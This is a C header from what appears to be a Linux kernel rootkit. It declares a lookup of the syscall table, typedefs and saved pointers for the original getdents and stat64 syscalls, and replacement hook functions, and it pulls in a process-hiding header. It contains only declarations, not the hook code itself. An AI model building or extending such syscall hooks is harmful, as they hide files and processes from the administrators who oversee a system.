
#ifndef _HOOKING_H
#define _HOOKING_H

#include <linux/kallsyms.h>		/* finding addresses of syscalls */
#include <uapi/asm/unistd.h>	/* syscall numbers */
#include <linux/dirent.h>		/* dirent struct */
#include <asm/page.h>			/* definition of PAGE_OFFSET */
#include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
#include <asm/uaccess.h>		/* copying to/from userland to kernel */
#include <linux/gfp.h>			/* GFP defines */
#include <linux/string.h>		/* string functions */
#include <linux/slab.h>			/* kernel memory allocation */
#include <uapi/asm/stat.h>		/* stat struct definition */
#include <linux/errno.h>
#include <linux/fs.h>
#include <uapi/linux/limits.h>


#include <linux/kernel.h>
#include <proc_hiding.h>

unsigned long *find_syscall_table (void);

typedef asmlinkage long (*sys_getdents_t) (unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);

typedef asmlinkage long (*sys_stat64_t) (const char __user *filename,
	struct stat64 __user *statbuf);

asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);

asmlinkage long sys_stat64_new(const char __user *filename,
	struct stat64 __user *statbuf);

extern sys_getdents_t sys_getdents_original;
extern sys_stat64_t sys_stat64_original;


#endif /* _HOOKING_H */